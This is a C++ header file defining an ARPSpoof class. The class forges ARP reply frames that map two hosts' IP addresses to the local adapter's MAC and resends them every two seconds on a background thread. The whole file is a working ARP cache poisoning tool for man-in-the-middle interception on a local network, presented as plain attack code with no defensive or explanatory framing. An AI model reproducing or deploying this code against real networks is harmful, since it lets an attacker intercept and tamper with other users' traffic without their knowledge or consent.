#ifndef ARPSPOOF_H_INCLUDED
#define ARPSPOOF_H_INCLUDED

#include "adapter.h"
#include "proto.h"

class ARPSpoof{
private:
    Adapter *adp = NULL;
    UINT period = 2000;
    DEVADDR a, b;
    BOOL isWork = FALSE;

    thread thSend;

    void SendThread(){
        DEVADDR fake1, fake2;
        fake1.ip = b.ip;
        memcpy(fake1.mac, adp->address().mac, 6);
        fake2.ip = a.ip;
        memcpy(fake2.mac, adp->address().mac, 6);

        UCHAR p1[1024], p2[1024];
        makeARP(fake1, a, ARP_OPER_REPLY, p1);
        makeETH(adp->address(), a, PROTO_ARP, p1);
        makeARP(fake2, b, ARP_OPER_REPLY, p2);
        makeETH(adp->address(), b, PROTO_ARP, p2);

        while(isWork){
            adp->send(p1, sizeof(ETH) + sizeof(ARP));
            adp->send(p2, sizeof(ETH) + sizeof(ARP));

            this_thread::sleep_for(chrono::milliseconds(period));
        }
    }

public:
    void setAdapter(Adapter *adapter){
        adp = adapter;
    }

    void spoof(DEVADDR A, DEVADDR B){
        a = A;
        b = B;

        isWork = TRUE;

        thSend = thread(SendThread, this);
    }

    void join(){
        isWork = FALSE;

        thSend.join();
    }
};

#endif // ARPSPOOF_H_INCLUDED
